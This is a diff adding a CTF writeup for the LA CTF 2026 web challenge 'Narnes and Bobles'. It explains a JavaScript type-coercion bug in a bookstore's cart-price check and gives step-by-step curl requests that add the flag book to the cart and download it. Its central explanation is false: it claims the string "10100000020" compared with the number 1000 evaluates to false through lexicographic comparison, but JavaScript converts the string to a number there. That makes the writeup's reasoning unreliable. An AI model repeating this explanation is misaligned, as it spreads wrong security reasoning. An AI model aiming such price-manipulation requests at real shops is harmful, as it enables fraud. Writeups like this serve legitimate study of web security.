@@ -1,0 +1,116 @@
+---
+title: 'LA CTF 2026 - Narnes and Bobles'
+description: 'Writeup for Narnes and Bobles from LA CTF 2026. A Web challenge involving JavaScript type coercion and string concatenation vulnerability.'
+date: 2026-02-09
+tags: ['writeup', 'web', 'javascript', 'type-coercion', 'logic-bug', 'lactf']
+authors: ['kudaliar']
+draft: false
+---
+
+**Flag:** `lactf{matcha_dubai_chocolate_labubu}`
+
+## Challenge Overview
+
+This challenge presents an online bookstore application where users can:
+- Register and login
+- Browse available books
+- Add books to cart (full or sample versions)
+- Checkout to download a ZIP file containing purchased books
+
+The goal is to obtain the flag, which is a book priced at 1,000,000 credits, while each user only starts with 1,000 credits.
+
+## Initial Analysis
+
+### Book Inventory (from `books.json`)
+```json
+[
+  { "id": "a3e33c2505a19d18", "title": "The Part-Time Parliament", "file": "part-time-parliament.pdf", "price": "10" },
+  { "id": "509d8c2a80e495fb", "title": "The End of Cryptography", "file": "end_of_cryptography.txt", "price": 20 },
+  { "id": "f4838abd731caf29", "title": "AVDestroyer Origin Lore", "file": "avd_origin_lore.txt", "price": 40 },
+  { "id": "2a16e349fb9045fa", "title": "Flag", "file": "flag.txt", "price": 1000000 }
+]
+```
+
+### Key Code Vulnerability (`server.js`)
+
+The critical vulnerability lies in the `/cart/add` endpoint's price calculation logic:
+
+```javascript
+const additionalSum = productsToAdd
+  .filter((product) => !+product.is_sample)
+  .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
+  .reduce((l, r) => l + r, 0);
+```
+
+**Notice the issue?** The first book has `"price": "10"` (a **string**), while other books have numeric prices. When JavaScript's `+` operator is used with mixed types (string + number), it performs **string concatenation** instead of numeric addition!
+
+## The Vulnerability
+
+### Type Confusion via String Concatenation
+
+When the `reduce()` function processes prices starting with the string `"10"`, the addition becomes string concatenation:
+
+```javascript
+// With mixed types:
+"10" + 1000000 + 20  // Results in: "10100000020" (string)
+
+// String comparison against balance (1000):
+"10100000020" > 1000  // false! (string "1" < number 1000 in lexicographic comparison)
+```
+
+This allows the balance check to pass because the comparison `"10100000020" > 1000` evaluates to `false` (string comparison is lexicographic, and `"1"` comes before `"1000"` character-wise).
+
+### Why the Cart Still Works
+
+The cart entries are inserted into the database with the actual `is_sample` value provided. When we send `is_sample: false` (or `0`), it stores `0` in the database, and at checkout:
+
+```javascript
+const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
+```
+
+Since `0` is falsy, the code serves the full file (`flag.txt`) instead of the sample (`flag_sample.txt`).
+
+## Exploitation Steps
+
+### Step 1: Register a new account
+```bash
+curl -X POST https://narnes-and-bobles.chall.lac.tf/register \
+  -d "username=attacker&password=pass" -L
+```
+
+### Step 2: Add books in specific order to trigger string concatenation
+The key is to add the string-priced book first, then the flag, ensuring the price calculation concatenates as a string:
+
+```bash
+curl -X POST https://narnes-and-bobles.chall.lac.tf/cart/add \
+  -H "Content-Type: application/json" \
+  -d '{
+    "products":[
+      {"book_id":"a3e33c2505a19d18","is_sample":false},
+      {"book_id":"2a16e349fb9045fa","is_sample":false},
+      {"book_id":"509d8c2a80e495fb","is_sample":false}
+    ]
+  }'
+```
+
+**Result:** The cart is populated with the flag book (`is_sample=0`), and the balance check passes!
+
+### Step 3: Checkout to receive the flag
+```bash
+curl -X POST https://narnes-and-bobles.chall.lac.tf/cart/checkout \
+  -o flag.zip
+```
+
+### Step 4: Extract and read the flag
+```bash
+unzip flag.zip
+cat flag.txt
+```
+
+## Lessons Learned
+
+1. **Type Safety:** Always ensure consistent data types in JSON data structures. Mixed types (string vs number) can lead to unexpected behavior in JavaScript.
+
+2. **JavaScript Quirks:** The `+` operator in JavaScript performs string concatenation when any operand is a string, which can create security vulnerabilities in financial calculations.
+
+3. **Validation Logic:** Balance checks should explicitly convert values to numbers before comparison to prevent type confusion attacks.
